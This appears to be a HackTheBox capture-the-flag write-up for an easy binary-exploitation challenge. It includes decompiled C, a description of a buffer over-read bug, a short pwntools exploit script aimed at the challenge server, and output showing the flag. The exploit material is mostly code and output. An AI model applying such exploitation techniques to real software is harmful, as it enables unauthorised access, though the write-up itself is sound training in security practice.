---
Category:
  - Pwn
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags:
  - code-review
  - reversing
---
>[!quote]
>*We are inside D12! We bypassed the scanning system, and now we are right in front of the Admin Panel. The problem is that there are some safety mechanisms enabled so that not everyone can access the admin panel and become the user right below Draeger. Only a few of his intergalactic team members have access there, and they are the mutants that Draeger trusts. Can you disable the mechanisms and take control of the Admin Panel?*


# Set up

No setup required. Downloaded the challenge locally

# Information Gathering

Enumerated binary type and implemented protections:

```bash
┌──(maoutis㉿kali)-[~/…/HTB-CA/Pwn/Space_Pirate_Going_Deeper/challenge]
└─$ file sp_going_deeper; checksec --file=sp_going_deeper
sp_going_deeper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9f094957db0c2401b2ba895893f94941d618463e, not stripped
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   77) Symbols       No    0               2               sp_going_deeper
```

## Decompiled code

- **main.c**
    
    ```c
    undefined8 main(void)
    
    {
      setup();
      banner();
      puts("\x1b[1;34m");
      admin_panel(1,2,3);
      return 0;
    }
    ```
    
- **banner.c**
    
    ```c
    void banner(void)
    
    {
      int iVar1;
      time_t tVar2;
      char *local_48 [4];
      undefined *local_28;
      undefined *local_20;
      undefined *local_18;
      char *ascii_art;
      
      local_48[0] = "\x1b[1;33m";
      local_48[1] = &DAT_00400c30;
      local_48[2] = &DAT_00400c38;
      local_48[3] = &DAT_00400c40;
      local_28 = &DAT_00400c48;
      local_20 = &DAT_00400c50;
      local_18 = &DAT_00400c58;
      tVar2 = time((time_t *)0x0);
      srand((uint)tVar2);
      iVar1 = rand();
      puts(local_48[iVar1 % 6]);
      puts("\n                  Trying to leak information from the pc.. 🖥\xfe0f\n\n");
      ascii_art = 
      "             ____________________________________________________\n            /                                                   \\\n           |   _____________________________________________     |\n           |   |                                            |    |\n           |   | goldenfang@d12:$ history                    |    |\n          |   |     1 ls                                    |    |\n           |   |     2 mvsecret_pass.txt flag.txt           |    |\n           |   |     3 chmod -x missile_launcher.py         |    |\n           |   |     4 ls                                    |    |\n           |  |     5 history                               |    |\n           |   |                                            |    |\n           |   |                                             |    |\n          |   |                                             |    |\n           |   |                                            |    |\n           |   |                                            |    |\n           |   |                                             |    |\n           |  |_____________________________________________|    |\n           |                                                     |\n            \\_____________________________________________________/\n                  \\_______________________________________/\n               _______________________________________________\n             _-\'   .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_\n          _-\'.-.-..---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_\n       _-\'.-.-.-..---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_\n    _-\'.-.-.-.-..-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_\n _-\'.-.-.-.-.-. .---.-..-----------------------------. .-.---..---.-.-.-.`-_\n:-----------------------------------------------------------------------------:\n`---._.-----------------------------------------------------------------._.---\'\n"
      ;
      puts(
          "             ____________________________________________________\n            /                                                   \\\n           |   _____________________________________________     |\n           |   |                                            |    |\n           |   | goldenfang@d12:$ history                    |   |\n           |   |     1 ls                                    |    |\n           |   |    2 mv secret_pass.txt flag.txt           |    |\n           |   |     3 chmod -xmissile_launcher.py          |    |\n           |   |     4 ls                                   |    |\n           |   |     5 history                               |    |\n           |  |                                             |    |\n           |   |                                            |    |\n           |   |                                             |   |\n           |   |                                             |    |\n           |   |                                            |    |\n           |   |                                            |    |\n           |   |_____________________________________________|   |\n           |                                                      |\n           \\_____________________________________________________/\n                  \\_______________________________________/\n               _______________________________________________\n             _-\'   .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_\n          _-\'.-.-..---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_\n       _-\'.-.-.-..---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_\n    _-\'.-.-.-.-..-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_\n _-\'.-.-.-.-.-. .---.-..-----------------------------. .-.---..---.-.-.-.`-_\n:-----------------------------------------------------------------------------:\n`---._.-----------------------------------------------------------------._.---\'\n"
          );
      return;
    }
    ```
    
- **admin_panel.c**
    
    ```c
    void admin_panel(long param_1,long param_2,long param_3)
    
    {
      int cmp_res;
      char input [40];
      long menu;
      
      menu = 0;
      printf(
             "[*] Safety mechanisms are enabled!\n[*] Values are set to: a = [%x], b = [%ld], c =[%ld].\n[*] If you want to continue, disable the mechanism or login as admin.\n"
             ,param_1,param_2,param_3);
      while (((menu != 1 && (menu != 2)) && (menu != 3))) {
        printf("\n1. Disable mechanisms ⚙\xfe0f\n2. Login ✅\n3. Exit 🏃\n>> ");
        menu = read_num();
      }
      if (menu == 1) {
        printf("\n[*] Input: ");
      }
      else {
        if (menu != 2) {
          puts("\n[!] Exiting..\n");
                        /* WARNING: Subroutine does not return */
          exit(0x1b39);
        }
        printf("\n[*] Username: ");
      }
      read(0,input,0x39);
      if (((param_1 != 0xdeadbeef) || (param_2 != 0x1337c0de)) || (param_3 != 0x1337beef)) {
        cmp_res = strncmp("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft",input,0x34);
        if (cmp_res != 0) {
          printf("\n%s[-] Authentication failed!\n",&DAT_00400c40);
          goto LAB_00400b38;
        }
      }
      printf("\n%s[+] Welcome admin! The secret message is: ",&DAT_00400c38);
      system("cat flag*");
    LAB_00400b38:
      puts("\n[!] For security reasons, you are logged out..\n");
      return;
    }
    ```
    

# The Bug

The binary allocated 40 bytes for the user input but then read 57 bytes

# Exploitation

```python
#!/usr/bin/python3
from pwn import *

pwd = b"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft"
pwd = pwd + b"\x00\x00\x00\x00\x00\x00"

p = remote('178.62.73.26',32236)

print(p.recvuntil(">> ", timeout=1).decode('latin-1'))
p.sendline(b'1')
print(p.recvuntil(":", timeout=1).decode('latin-1'))
sys.stdout.buffer.write(pwd)
p.sendline(pwd)
p.interactive()
p.recv()
p.interactive()
```

```bash
┌──(maoutis㉿kali)-[~/…/HTB-CA/Pwn/Space_Pirate_Going_Deeper/challenge]
└─$ proxychains python3 exploit.py                                                          1 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[+] Opening connection to 178.62.73.26 on port 32236: Done
...
[*] Safety mechanisms are enabled!
[*] Values are set to: a = [1], b = [2], c = [3].
[*] If you want to continue, disable the mechanism or login as admin.

1. Disable mechanisms âï¸
2. Login â
3. Exit ð

[*] Input:
DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft[*] Switching to interactive mode

[+] Welcome admin! The secret message is: HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}
[!] For security reasons, you are logged out..
```

# Flag

>[!success]
>`HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}`

